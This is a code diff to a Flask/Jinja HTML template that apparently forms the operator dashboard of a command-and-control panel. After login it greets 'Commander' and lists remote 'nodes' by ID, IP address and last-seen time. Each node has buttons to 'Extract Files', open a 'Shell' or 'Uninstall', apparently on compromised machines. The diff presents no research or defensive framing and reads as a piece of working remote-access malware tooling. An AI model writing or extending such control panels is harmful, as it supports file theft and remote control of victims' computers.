@@ -3,7 +3,31 @@
 {% block body %}
 
     {% if session.logged_in %}
-        <h2>Welcome, commander</h2>
+        <h2>Welcome, Commander</h2>
+        <br/>
+        <table class="table table-striped">
+            <thead>
+                <tr>
+                    <th scope="col">Node ID</th>
+                    <th scope="col">IP Address</th>
+                    <th scope="col">Last Seen</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for node in nodes %}
+                    <tr>
+                        <td>{{node.id}}</td>
+                        <td>{{node.ip}}</td>
+                        <td>{{round(current_time - node.time)}} seconds ago</td>
+                        <td>
+                            <a href="/ndc?node={{node.id}}&action=1" class="btn btn-primary">Extract Files</a>
+                            <a href="/ndc?node={{node.id}}&action=2" class="btn btn-primary">Shell</a>
+                            <a href="/ndc?node={{node.id}}&action=3" class="btn btn-danger">Uninstall</a>
+                        </td>
+                    </tr>
+                {% endfor %}
+            </tbody>
+        </table>
         <a href="/lgt" class="btn btn-primary">Logout</a>
     {% else %}
         <form method="POST" action="">
